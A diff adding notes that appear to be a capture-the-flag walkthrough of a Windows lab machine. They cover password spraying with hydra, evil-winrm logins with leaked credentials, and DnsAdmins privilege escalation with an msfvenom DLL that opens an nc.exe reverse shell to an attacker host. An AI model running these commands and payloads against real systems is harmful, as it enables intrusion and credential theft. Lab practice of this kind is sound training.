@@ -91,3 +91,55 @@ melanie
 zach
 simon
 naoki
+Running enum4linux returns some info:
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
+
+We need to find who still has this default password set.
+
+└─# hydra -L users -P pass.txt 10.10.10.169 smb
+[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!
+evil-winrm -u 'MEGABANK\melanie' -p 'Welcome123!' -i 10.10.10.169
+*Evil-WinRM* PS C:\Users\melanie\desktop> type user.txt
+0c3be45fcfe249796ccbee8d3a978540
+
+Search for hidden files:
+Get-ChildItem C:\ -Recurse -Force -ErrorAction SilentlyContinue | Where { ($_.Attributes.ToString() -Split ", ") -Contains "Hidden" } | Select FullName
+ 
+C:\PSTranscripts\20191203
+C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+
+*Evil-WinRM* PS C:\PSTranscripts\20191203> dir
+*Evil-WinRM* PS C:\PSTranscripts\20191203> gci -force
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+
+*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
+>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+
+===========================
+Priveleges Escalation
+===========================
+ryan: Serv3r4Admin4cc123!
+└─# evil-winrm -u 'MEGABANK\ryan' -p 'Serv3r4Admin4cc123!' -i 10.10.10.169
+*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
+Groups : MEGABANK\DnsAdmins   
+I need a way to exploit DNS; Will do this through injecting a DLL;
+1. Build a custom DLL. Once loaded by DNS, it should give me a reverse shell
+2. Open up a local server accessible by remote/victim machine. (smb server)
+3. Open a netcat listener
+4. Execute the dnscmd cli to inject the DLL
+5. Spawn a root shell.
+Get needed info, machine's architecture : $env:PROCESSOR_ARCHITECTURE => AMD64
+To build the malicious DLL, I use msfvenom:
+1. msfvenom -p windows/x64/exec CMD='\\10.10.14.11\PLUGIN\nc.exe 10.10.14.11 4444 -e cmd.exe' -f dll > privesc_plugin.dll 
+2. └─# python smbserver.py share '/home/joe/Downloads/htb/oscp/windows/resolute' -smb2support;
+net use Z: \\10.10.14.11\plugin
+3. dnscmd resolute /config /serverleveldll \\10.10.14.11\PLUGIN\privesc_plugin.dll 
+4. sc.exe \\resolute stop dns
+5. sc.exe \\resolute start dns
+
+
+Reference : https://ctf.terkiba.com/resolute/
+
